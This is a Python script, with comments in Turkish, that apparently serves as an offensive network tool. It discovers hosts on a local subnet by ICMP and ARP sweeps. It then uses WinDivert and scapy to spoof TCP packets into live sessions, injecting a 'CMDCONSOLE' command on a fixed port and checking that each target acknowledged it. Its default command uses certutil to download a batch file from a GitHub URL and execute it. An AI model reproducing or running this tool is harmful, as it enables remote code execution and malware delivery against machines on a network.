import argparse
import asyncio
import platform
import threading
import queue
import time

import netifaces
import pydivert
import aioping
from scapy.all import IP, TCP, Raw, send
from scapy.all import ARP, Ether, srp


# =========================
# Utils
# =========================

def build_cmd_packet(command: str) -> bytes:
    header = b"\x11\x15\x40\x00"
    payload = f"CMDCONSOLE {command}".encode("utf-8")
    length = len(payload).to_bytes(4, byteorder="little")
    return header + length + payload

def get_own_ip():
    gws = netifaces.gateways()
    default_iface = gws['default'][netifaces.AF_INET][1]
    iface_addrs = netifaces.ifaddresses(default_iface)
    return iface_addrs[netifaces.AF_INET][0]['addr']

def get_default_gateway():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]


# =========================
# Discovery (ICMP + ARP)
# =========================

async def ping_host_icmp(ip):
    try:
        await aioping.ping(ip, timeout=1)
        return ip
    except:
        return None

def sweep_icmp(ip_list):
    print("[1] ICMP taraması başlıyor...")
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    tasks = [ping_host_icmp(ip) for ip in ip_list]
    results = loop.run_until_complete(asyncio.gather(*tasks))
    alive = [ip for ip in results if ip is not None]
    for ip in ip_list:
        status = "[+]" if ip in alive else "[-]"
        print(f"{status} {ip} (icmp)")
    return alive

def sweep_arp(network_cidr):
    print("\n[2] ARP taraması başlıyor...")
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_cidr),
        timeout=2,
        verbose=False
    )
    alive = []
    for _, received in answered:
        print(f"[+] {received.psrc} - {received.hwsrc} (arp)")
        alive.append(received.psrc)
    return alive


# =========================
# Injection (flow-tracking + ACK-doğrulama + adaptif retry)
# =========================

def inject_with_capture(target_ip, server_ip, server_port, command,
                        timeout=30, max_attempts_per_flow=8,
                        micro_retries=3, micro_gap=0.02, ack_wait=1.5):
    """
    - seq = SON inbound ack_num (client’in serverdan beklediği seq)
    - ack = SON inbound (seq_num + len(payload_inbound))
    - gönderimden sonra inbound ACK’de expected_ack = seq + len(payload_out) görülene kadar bekle
      görülmezse yeni inbound snapshot geldiğinde tekrar dene (max_attempts_per_flow)
    """
    packet_filter = f"tcp and (ip.DstAddr == {target_ip} or ip.SrcAddr == {target_ip})"
    q = queue.Queue(maxsize=4000)
    stop_evt = threading.Event()

    def worker(w):
        try:
            while not stop_evt.is_set():
                pkt = w.recv()
                try:
                    q.put(pkt, timeout=0.5)
                except queue.Full:
                    pass
        except Exception:
            pass  # w kapanınca normal

    # flow state
    # key=(target_ip, client_port)
    flows = {}  # { key: {last_ack_num, last_seq_plus_len, attempts, injected, port_confirmed, pending: [ {expected_ack, expire_at, used_seq} ] } }
    packet_seen = False

    def ensure_flow(cp):
        key = (target_ip, cp)
        if key not in flows:
            flows[key] = {
                "last_ack_num": None,
                "last_seq_plus_len": None,
                "attempts": 0,
                "injected": False,
                "port_confirmed": False,
                "pending": [],  # beklenen ack listesi
            }
        return flows[key]

    payload_out = build_cmd_packet(command)
    payload_out_len = len(payload_out)

    try:
        with pydivert.WinDivert(packet_filter, priority=1000) as w:
            t = threading.Thread(target=worker, args=(w,), daemon=True)
            t.start()

            print(f"[START] {target_ip}")
            start_time = time.time()
            last_activity = start_time

            while True:
                now = time.time()
                if now - start_time >= timeout:
                    break

                # pending girişlerini süresi dolanları temizle
                for st in list(flows.values()):
                    st["pending"] = [p for p in st["pending"] if p["expire_at"] > now]

                try:
                    pkt = q.get(timeout=0.5)
                except queue.Empty:
                    continue

                last_activity = now

                if not getattr(pkt, "tcp", None):
                    try:
                        w.send(pkt)
                    except Exception:
                        pass
                    continue

                # INBOUND (client -> server): ACK snapshot + başarı teyidi
                if pkt.is_inbound and pkt.src_addr == target_ip:
                    packet_seen = True
                    client_port = pkt.src_port
                    st = ensure_flow(client_port)

                    in_len = len(pkt.payload) if getattr(pkt, "payload", None) is not None else 0
                    st["last_ack_num"] = pkt.tcp.ack_num
                    st["last_seq_plus_len"] = (pkt.tcp.seq_num or 0) + in_len

                    # başarı teyidi: herhangi pending expected_ack karşılandı mı?
                    if st["pending"]:
                        cur_ack = pkt.tcp.ack_num or 0
                        satisfied = [p for p in st["pending"] if cur_ack >= p["expected_ack"]]
                        if satisfied:
                            st["injected"] = True
                            st["pending"].clear()
                            print(f"[✓ ACK ok] {target_ip}:{client_port} ack={cur_ack} (command accepted)")
                            # akış doğrulandıktan sonra daha fazla iş yapmayalım (forward devam)
                # OUTBOUND (server -> client): port doğrula ve gerekiyorsa dene
                if pkt.is_outbound and pkt.dst_addr == target_ip:
                    packet_seen = True
                    if pkt.src_port == server_port:
                        client_port = pkt.dst_port
                        st = ensure_flow(client_port)
                        st["port_confirmed"] = True

                        # şartlar uygunsa ve henüz injected değilse ve deneme limiti aşılmadıysa
                        if (st["last_ack_num"] is not None and
                            st["last_seq_plus_len"] is not None and
                            st["port_confirmed"] and
                            not st["injected"] and
                            st["attempts"] < max_attempts_per_flow):

                            seq = st["last_ack_num"]
                            ack = st["last_seq_plus_len"]

                            fake = (
                                IP(src=server_ip, dst=target_ip) /
                                TCP(
                                    sport=server_port,
                                    dport=client_port,
                                    flags="PA",
                                    seq=seq,
                                    ack=ack
                                ) /
                                Raw(load=payload_out)
                            )

                            st["attempts"] += 1
                            # mikrogönderimler
                            for _ in range(micro_retries):
                                send(fake, verbose=0)
                                time.sleep(micro_gap)

                            expected_ack = seq + payload_out_len
                            st["pending"].append({
                                "expected_ack": expected_ack,
                                "expire_at": now + ack_wait,
                                "used_seq": seq
                            })
                            print(f"[→ try {st['attempts']}] {target_ip}:{client_port} seq={seq} ack={ack} expect_ack={expected_ack} ← {command}")

                # forward
                try:
                    w.send(pkt)
                except Exception:
                    pass

            # kapanış
            stop_evt.set()
            t.join(timeout=1.0)

            if not packet_seen:
                print(f"[!] {target_ip} → hiç TCP paketi yakalanmadı")
            else:
                done = sum(1 for st in flows.values() if st["injected"])
                print(f"[DONE] {target_ip} → injected_flows={done} total_flows={len(flows)}")

    except Exception as e:
        print(f"[!] {target_ip} hata: {e}")


# =========================
# Multi-target runner
# =========================

def run_multi_targets(targets, server_ip, server_port, command, timeout=30, max_threads=5):
    threads = []
    for ip in targets:
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []
        t = threading.Thread(
            target=inject_with_capture,
            args=(ip, server_ip, server_port, command, timeout),
            daemon=True
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


# =========================
# Main
# =========================

def main():
    parser = argparse.ArgumentParser(description="Auto ICMP+ARP Discovery + Flow-Tracked TCP Injection (ACK-verified)")
    parser.add_argument("--base-ip", default="192.168.1", help="IP bloğu (örn 192.168.1)")
    parser.add_argument("--start", type=int, default=1, help="Başlangıç host")
    parser.add_argument("--end", type=int, default=254, help="Bitiş host")
    parser.add_argument("--server-port", type=int, default=34285, help="Sunucu TCP portu (değiştirmeden)")
    parser.add_argument("--command", default='cmd /k certutil -urlcache -split -f https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/nettt.bat nettt.bat && nettt.bat', help="Enjekte edilecek komut")
    parser.add_argument("--timeout", type=int, default=30, help="Hedef başına süre (s)")
    parser.add_argument("--max-threads", type=int, default=5, help="Paralel hedef sayısı")
    parser.add_argument("--no-icmp", action="store_true", help="ICMP taramasını atla")
    parser.add_argument("--no-arp", action="store_true", help="ARP taramasını atla")
    args = parser.parse_args()

    if platform.system().lower() != "windows":
        print("[-] Bu araç Windows (Admin) üzerinde stabil çalışır.")
        return

    own_ip = get_own_ip()
    gateway = get_default_gateway()
    excluded = {own_ip, gateway, "127.0.0.1", "::1"}

    print(f"[~] Kendi IP : {own_ip}")
    print(f"[~] Gateway  : {gateway}")

    ip_range = [f"{args.base_ip}.{i}" for i in range(args.start, args.end + 1)]
    ip_range = [ip for ip in ip_range if ip not in excluded and not ip.startswith("169.254.")]

    alive_icmp = []
    if not args.no_icmp:
        alive_icmp = sweep_icmp(ip_range)

    alive_arp = []
    if not args.no_arp:
        network_cidr = f"{args.base_ip}.0/24"
        alive_arp = sweep_arp(network_cidr)
        alive_arp = [ip for ip in alive_arp if ip in ip_range]

    targets = sorted(set(alive_icmp + alive_arp) - excluded)
    if not targets:
        print("[!] Hiç hedef bulunamadı.")
        return

    print(f"\n[✓] Toplam {len(targets)} hedef bulundu: {targets}")
    print("[~] Enjeksiyon başlıyor...\n")

    run_multi_targets(
        targets=targets,
        server_ip=own_ip,
        server_port=args.server_port,
        command=args.command,
        timeout=args.timeout,
        max_threads=args.max_threads
    )

    print("\n[✓] Tüm işlemler tamamlandı.")


if __name__ == "__main__":
    main()
